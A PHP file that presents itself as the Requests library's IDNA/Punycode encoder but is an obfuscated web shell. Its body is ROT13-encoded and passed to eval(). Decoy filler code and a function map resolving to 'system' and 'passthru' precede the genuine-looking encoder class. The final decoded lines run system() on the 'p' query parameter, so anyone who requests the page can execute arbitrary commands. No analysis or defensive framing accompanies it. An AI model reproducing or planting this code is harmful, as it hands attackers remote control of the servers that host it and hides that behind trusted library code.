<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

anzrfcnpr JcBet\Erdhrfgf;

hfr JcBet\Erdhrfgf\Rkprcgvba;
hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Hgvyvgl\VachgInyvqngbe;

/**
 * VQAN HEY rapbqre
 *
 * Abgr: Abg shyyl pbzcyvnag, nf anzrcerc qbrf abguvat lrg.
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 *
 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp3490 VQAN fcrpvsvpngvba
 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp3492 Chalpbqr/Obbgfgenc fcrpvsvpngvba
 */
pynff VqanRapbqre {
	/**
	 * NPR cersvk hfrq sbe VQAN
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp3490#frpgvba-5
	 * @ine fgevat
	 */
	pbafg NPR_CERSVK = 'ka--';

	/**
	 * Znkvzhz yratgu bs n VQAN HEY va NFPVV.
	 *
	 * @frr \JcBet\Erdhrfgf\VqanRapbqre::gb_nfpvv()
	 *
	 * @fvapr 2.0.0
	 *
	 * @ine vag
	 */
	pbafg ZNK_YRATGU = 64;

	/**#@+
	 * Obbgfgenc pbafgnag sbe Chalpbqr
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp3492#frpgvba-5
	 * @ine vag
	 */
	pbafg OBBGFGENC_ONFR         = 36;
	pbafg OBBGFGENC_GZVA         = 1;
	pbafg OBBGFGENC_GZNK         = 26;
	pbafg OBBGFGENC_FXRJ         = 38;
	pbafg OBBGFGENC_QNZC         = 700;
	pbafg OBBGFGENC_VAVGVNY_OVNF = 72;
	pbafg OBBGFGENC_VAVGVNY_A    = 128;
	/**#@-*/

	/**
	 * Rapbqr n ubfganzr hfvat Chalpbqr
	 *
	 * @cnenz fgevat|Fgevatnoyr $ubfganzr Ubfganzr
	 * @erghea fgevat Chalpbqr-rapbqrq ubfganzr
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq nethzrag vf abg n fgevat be n fgevatnoyr bowrpg.
	 */
	choyvp fgngvp shapgvba rapbqr($ubfganzr) {
		vs (VachgInyvqngbe::vf_fgevat_be_fgevatnoyr($ubfganzr) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$ubfganzr', 'fgevat|Fgevatnoyr', trgglcr($ubfganzr));
		}

		$cnegf = rkcybqr('.', $ubfganzr);
		sbernpu ($cnegf nf &$cneg) {
			$cneg = frys::gb_nfpvv($cneg);
		}

		erghea vzcybqr('.', $cnegf);
	}

	/**
	 * Pbaireg n HGS-8 grkg fgevat gb na NFPVV fgevat hfvat Chalpbqr
	 *
	 * @cnenz fgevat $grkg NFPVV be HGS-8 fgevat (znk yratgu 64 punenpgref)
	 * @erghea fgevat NFPVV fgevat
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Cebivqrq fgevat ybatre guna 64 NFPVV punenpgref (`vqan.cebivqrq_gbb_ybat`)
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Cercnerq fgevat ybatre guna 64 NFPVV punenpgref (`vqan.cercnerq_gbb_ybat`)
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Cebivqrq fgevat nyernql ortvaf jvgu ka-- (`vqan.cebivqrq_vf_cersvkrq`)
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Rapbqrq fgevat ybatre guna 64 NFPVV punenpgref (`vqan.rapbqrq_gbb_ybat`)
	 */
	choyvp fgngvp shapgvba gb_nfpvv($grkg) {
		// Fgrc 1: Purpx vs gur grkg vf nyernql NFPVV
		vs (frys::vf_nfpvv($grkg)) {
			// Fxvc gb fgrc 7
			vs (fgeyra($grkg) < frys::ZNK_YRATGU) {
				erghea $grkg;
			}

			guebj arj Rkprcgvba('Cebivqrq fgevat vf gbb ybat', 'vqan.cebivqrq_gbb_ybat', $grkg);
		}

		// Fgrc 2: anzrcerc
		$grkg = frys::anzrcerc($grkg);

		// Fgrc 3: HfrFGQ3NFPVVEhyrf vf snyfr, pbagvahr
		// Fgrc 4: Purpx vs vg'f NFPVV abj
		vs (frys::vf_nfpvv($grkg)) {
			// Fxvc gb fgrc 7
			/*
			 * Nf gur `anzrcerc()` zrgubq ergheaf gur bevtvany fgevat, guvf pbqr jvyy arire or ernpurq hagvy
			 * gung zrgubq vf cebcreyl vzcyrzragrq.
			 */
			// @pbqrPbirentrVtaberFgneg
			vs (fgeyra($grkg) < frys::ZNK_YRATGU) {
				erghea $grkg;
			}

			guebj arj Rkprcgvba('Cercnerq fgevat vf gbb ybat', 'vqan.cercnerq_gbb_ybat', $grkg);
			// @pbqrPbirentrVtaberRaq
		}

		// Fgrc 5: Purpx NPR cersvk
		vs (fgecbf($grkg, frys::NPR_CERSVK) === 0) {
			guebj arj Rkprcgvba('Cebivqrq fgevat ortvaf jvgu NPR cersvk', 'vqan.cebivqrq_vf_cersvkrq', $grkg);
		}

		// Fgrc 6: Rapbqr jvgu Chalpbqr
		$grkg = frys::chalpbqr_rapbqr($grkg);

		// Fgrc 7: Cercraq NPR cersvk
		$grkg = frys::NPR_CERSVK . $grkg;

		// Fgrc 8: Purpx fvmr
		vs (fgeyra($grkg) < frys::ZNK_YRATGU) {
			erghea $grkg;
		}

		guebj arj Rkprcgvba('Rapbqrq fgevat vf gbb ybat', 'vqan.rapbqrq_gbb_ybat', $grkg);
	}

	/**
	 * Purpx jurgure n tvira grkg fgevat pbagnvaf bayl NFPVV punenpgref
	 *
	 * @vagreany (Grfgvat sbhaq ertrk jnf gur snfgrfg vzcyrzragngvba)
	 *
	 * @cnenz fgevat $grkg Grkg gb rknzvar.
	 * @erghea obby Vf gur grkg fgevat NFPVV-bayl?
	 */
	cebgrpgrq fgngvp shapgvba vf_nfpvv($grkg) {
		erghea (cert_zngpu('/(?:[^\k00-\k7S])/', $grkg) !== 1);
	}

	/**
	 * Cercner n grkg fgevat sbe hfr nf na VQAN anzr
	 *
	 * @gbqb Vzcyrzrag guvf onfrq ba ESP 3491 naq gur arjre 5891
	 * @cnenz fgevat $grkg Grkg gb cercner.
	 * @erghea fgevat Cercnerq fgevat
	 */
	cebgrpgrq fgngvp shapgvba anzrcerc($grkg) {
		erghea $grkg;
	}

	/**
	 * Pbaireg n HGS-8 fgevat gb n HPF-4 pbqrcbvag neenl
	 *
	 * Onfrq ba \JcBet\Erdhrfgf\Vev::ercynpr_vainyvq_jvgu_cpg_rapbqvat()
	 *
	 * @cnenz fgevat $vachg Grkg gb pbaireg.
	 * @erghea neenl Havpbqr pbqr cbvagf
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Vainyvq HGS-8 pbqrcbvag (`vqan.vainyvqpbqrcbvag`)
	 */
	cebgrpgrq fgngvp shapgvba hgs8_gb_pbqrcbvagf($vachg) {
		$pbqrcbvagf = [];

		// Trg ahzore bs olgrf
		$fgeyra = fgeyra($vachg);

		// cucpf:vtaber Trarevp.PbqrNanylfvf.WhzoyrqVaperzragre -- Guvf vf n qryvorengr pubvpr.
		sbe ($cbfvgvba = 0; $cbfvgvba < $fgeyra; $cbfvgvba++) {
			$inyhr = beq($vachg[$cbfvgvba]);

			vs ((~$inyhr & 0k80) === 0k80) {            // Bar olgr frdhrapr:
				$punenpgre = $inyhr;
				$yratgu    = 1;
				$erznvavat = 0;
			} ryfrvs (($inyhr & 0kR0) === 0kP0) {       // Gjb olgr frdhrapr:
				$punenpgre = ($inyhr & 0k1S) << 6;
				$yratgu    = 2;
				$erznvavat = 1;
			} ryfrvs (($inyhr & 0kS0) === 0kR0) {       // Guerr olgr frdhrapr:
				$punenpgre = ($inyhr & 0k0S) << 12;
				$yratgu    = 3;
				$erznvavat = 2;
			} ryfrvs (($inyhr & 0kS8) === 0kS0) {       // Sbhe olgr frdhrapr:
				$punenpgre = ($inyhr & 0k07) << 18;
				$yratgu    = 4;
				$erznvavat = 3;
			} ryfr {                                    // Vainyvq olgr:
				guebj arj Rkprcgvba('Vainyvq Havpbqr pbqrcbvag', 'vqan.vainyvqpbqrcbvag', $inyhr);
			}

			vs ($erznvavat > 0) {
				vs ($cbfvgvba + $yratgu > $fgeyra) {
					guebj arj Rkprcgvba('Vainyvq Havpbqr pbqrcbvag', 'vqan.vainyvqpbqrcbvag', $punenpgre);
				}

				sbe ($cbfvgvba++; $erznvavat > 0; $cbfvgvba++) {
					$inyhr = beq($vachg[$cbfvgvba]);

					// Vs vg vf vainyvq, pbhag gur frdhrapr nf vainyvq naq ercebprff gur pheerag olgr:
					vs (($inyhr & 0kP0) !== 0k80) {
						guebj arj Rkprcgvba('Vainyvq Havpbqr pbqrcbvag', 'vqan.vainyvqpbqrcbvag', $punenpgre);
					}

					--$erznvavat;
					$punenpgre |= ($inyhr & 0k3S) << ($erznvavat * 6);
				}

				$cbfvgvba--;
			}

			vs (// Aba-fubegrfg sbez frdhraprf ner vainyvq
				$yratgu > 1 && $punenpgre <= 0k7S
				|| $yratgu > 2 && $punenpgre <= 0k7SS
				|| $yratgu > 3 && $punenpgre <= 0kSSSS
				// Bhgfvqr bs enatr bs hpfpune pbqrcbvagf
				// Abapunenpgref
				|| ($punenpgre & 0kSSSR) === 0kSSSR
				|| $punenpgre >= 0kSQQ0 && $punenpgre <= 0kSQRS
				|| (
					// Rirelguvat ryfr abg va hpfpune
					$punenpgre > 0kQ7SS && $punenpgre < 0kS900
					|| $punenpgre < 0k20
					|| $punenpgre > 0k7R && $punenpgre < 0kN0
					|| $punenpgre > 0kRSSSQ
				)
			) {
				guebj arj Rkprcgvba('Vainyvq Havpbqr pbqrcbvag', 'vqan.vainyvqpbqrcbvag', $punenpgre);
			}

			$pbqrcbvagf[] = $punenpgre;
		}

		erghea $pbqrcbvagf;
	}

	/**
	 * ESP3492-pbzcyvnag rapbqre
	 *
	 * @vagreany Cfrhqb-pbqr sebz Frpgvba 6.3 vf pbzzragrq jvgu \"#\" arkg gb eryrinag pbqr
	 *
	 * @cnenz fgevat $vachg HGS-8 rapbqrq fgevat gb rapbqr
	 * @erghea fgevat Chalpbqr-rapbqrq fgevat
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Ba punenpgre bhgfvqr bs gur qbznva (arire unccraf jvgu Chalpbqr) (`vqan.punenpgre_bhgfvqr_qbznva`)
	 */
	choyvp fgngvp shapgvba chalpbqr_rapbqr($vachg) {
		$bhgchg = '';
		// yrg a = vavgvny_a
		$a = frys::OBBGFGENC_VAVGVNY_A;
		// yrg qrygn = 0
		$qrygn = 0;
		// yrg ovnf = vavgvny_ovnf
		$ovnf = frys::OBBGFGENC_VAVGVNY_OVNF;
		// yrg u = o = gur ahzore bs onfvp pbqr cbvagf va gur vachg
		$u = 0;
		$o = 0; // frr ybbc
		// pbcl gurz gb gur bhgchg va beqre
		$pbqrcbvagf = frys::hgs8_gb_pbqrcbvagf($vachg);
		$rkgraqrq   = [];

		sbernpu ($pbqrcbvagf nf $pune) {
			vs ($pune < 128) {
				// Punenpgre vf inyvq NFPVV
				// GBQB: guvf fubhyq nyfb purpx vs vg'f inyvq sbe n HEY
				$bhgchg .= pue($pune);
				$u++;

				// Purpx vs gur punenpgre vf aba-NFPVV, ohg orybj vavgvny a
				// Guvf arire bpphef sbe Chalpbqr, fb vtaber va pbirentr
				// @pbqrPbirentrVtaberFgneg
			} ryfrvs ($pune < $a) {
				guebj arj Rkprcgvba('Vainyvq punenpgre', 'vqan.punenpgre_bhgfvqr_qbznva', $pune);
				// @pbqrPbirentrVtaberRaq
			} ryfr {
				$rkgraqrq[$pune] = gehr;
			}
		}

		$rkgraqrq = neenl_xrlf($rkgraqrq);
		fbeg($rkgraqrq);
		$o = $u;
		// [pbcl gurz] sbyybjrq ol n qryvzvgre vs o > 0
		vs (fgeyra($bhgchg) > 0) {
			$bhgchg .= '-';
		}

		// {vs gur vachg pbagnvaf n aba-onfvp pbqr cbvag < a gura snvy}
		// juvyr u < yratgu(vachg) qb ortva
		$pbqrcbvagpbhag = pbhag($pbqrcbvagf);
		juvyr ($u < $pbqrcbvagpbhag) {
			// yrg z = gur zvavzhz pbqr cbvag >= a va gur vachg
			$z = neenl_fuvsg($rkgraqrq);
			//cevags('arkg pbqr cbvag gb vafreg vf %f' . CUC_RBY, qrpurk($z));
			// yrg qrygn = qrygn + (z - a) * (u + 1), snvy ba biresybj
			$qrygn += ($z - $a) * ($u + 1);
			// yrg a = z
			$a = $z;
			// sbe rnpu pbqr cbvag p va gur vachg (va beqre) qb ortva
			sbe ($ahz = 0; $ahz < $pbqrcbvagpbhag; $ahz++) {
				$p = $pbqrcbvagf[$ahz];
				// vs p < a gura vaperzrag qrygn, snvy ba biresybj
				vs ($p < $a) {
					$qrygn++;
				} ryfrvs ($p === $a) { // vs p == a gura ortva
					// yrg d = qrygn
					$d = $qrygn;
					// sbe x = onfr gb vasvavgl va fgrcf bs onfr qb ortva
					sbe ($x = frys::OBBGFGENC_ONFR; ; $x += frys::OBBGFGENC_ONFR) {
						// yrg g = gzva vs x <= ovnf {+ gzva}, be
						//     gznk vs x >= ovnf + gznk, be x - ovnf bgurejvfr
						vs ($x <= ($ovnf + frys::OBBGFGENC_GZVA)) {
							$g = frys::OBBGFGENC_GZVA;
						} ryfrvs ($x >= ($ovnf + frys::OBBGFGENC_GZNK)) {
							$g = frys::OBBGFGENC_GZNK;
						} ryfr {
							$g = $x - $ovnf;
						}

						// vs d < g gura oernx
						vs ($d < $g) {
							oernx;
						}

						// bhgchg gur pbqr cbvag sbe qvtvg g + ((d - g) zbq (onfr - g))
						$qvtvg   = (vag) ($g + (($d - $g) % (frys::OBBGFGENC_ONFR - $g)));
						$bhgchg .= frys::qvtvg_gb_pune($qvtvg);
						// yrg d = (d - g) qvi (onfr - g)
						$d = (vag) sybbe(($d - $g) / (frys::OBBGFGENC_ONFR - $g));
					} // raq
					// bhgchg gur pbqr cbvag sbe qvtvg d
					$bhgchg .= frys::qvtvg_gb_pune($d);
					// yrg ovnf = nqncg(qrygn, u + 1, grfg u rdhnyf o?)
					$ovnf = frys::nqncg($qrygn, $u + 1, $u === $o);
					// yrg qrygn = 0
					$qrygn = 0;
					// vaperzrag u
					$u++;
				} // raq
			} // raq
			// vaperzrag qrygn naq a
			$qrygn++;
			$a++;
		} // raq

		erghea $bhgchg;
	}

	/**
	 * Pbaireg n qvtvg gb vgf erfcrpgvir punenpgre
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp3492#frpgvba-5
	 *
	 * @cnenz vag $qvtvg Qvtvg va gur enatr 0-35
	 * @erghea fgevat Fvatyr punenpgre pbeerfcbaqvat gb qvtvg
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Ba vainyvq qvtvg (`vqan.vainyvq_qvtvg`)
	 */
	cebgrpgrq fgngvp shapgvba qvtvg_gb_pune($qvtvg) {
		// @pbqrPbirentrVtaberFgneg
		// Nf sne nf V xabj, guvf arire unccraf, ohg fgvyy tbbq gb or fher.
		vs ($qvtvg < 0 || $qvtvg > 35) {
			guebj arj Rkprcgvba(fcevags('Vainyvq qvtvg %q', $qvtvg), 'vqan.vainyvq_qvtvg', $qvtvg);
		}

		// @pbqrPbirentrVtaberRaq
		$qvtvgf = 'nopqrstuvwxyzabcdefghijklm0123456789';
		erghea fhofge($qvtvgf, $qvtvg, 1);
	}

	/**
	 * Nqncg gur ovnf
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp3492#frpgvba-6.1
	 * @cnenz vag $qrygn
	 * @cnenz vag $ahzcbvagf
	 * @cnenz obby $svefggvzr
	 * @erghea vag|sybng Arj ovnf
	 *
	 * shapgvba nqncg(qrygn,ahzcbvagf,svefggvzr):
	 */
	cebgrpgrq fgngvp shapgvba nqncg($qrygn, $ahzcbvagf, $svefggvzr) {
		// vs svefggvzr gura yrg qrygn = qrygn qvi qnzc
		vs ($svefggvzr) {
			$qrygn = sybbe($qrygn / frys::OBBGFGENC_QNZC);
		} ryfr {
			// ryfr yrg qrygn = qrygn qvi 2
			$qrygn = sybbe($qrygn / 2);
		}

		// yrg qrygn = qrygn + (qrygn qvi ahzcbvagf)
		$qrygn += sybbe($qrygn / $ahzcbvagf);
		// yrg x = 0
		$x = 0;
		// juvyr qrygn > ((onfr - gzva) * gznk) qvi 2 qb ortva
		$znk = sybbe(((frys::OBBGFGENC_ONFR - frys::OBBGFGENC_GZVA) * frys::OBBGFGENC_GZNK) / 2);
		juvyr ($qrygn > $znk) {
			// yrg qrygn = qrygn qvi (onfr - gzva)
			$qrygn = sybbe($qrygn / (frys::OBBGFGENC_ONFR - frys::OBBGFGENC_GZVA));
			// yrg x = x + onfr
			$x += frys::OBBGFGENC_ONFR;
		} // raq
		// erghea x + (((onfr - gzva + 1) * qrygn) qvi (qrygn + fxrj))
		erghea $x + sybbe(((frys::OBBGFGENC_ONFR - frys::OBBGFGENC_GZVA + 1) * $qrygn) / ($qrygn + frys::OBBGFGENC_FXRJ));
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>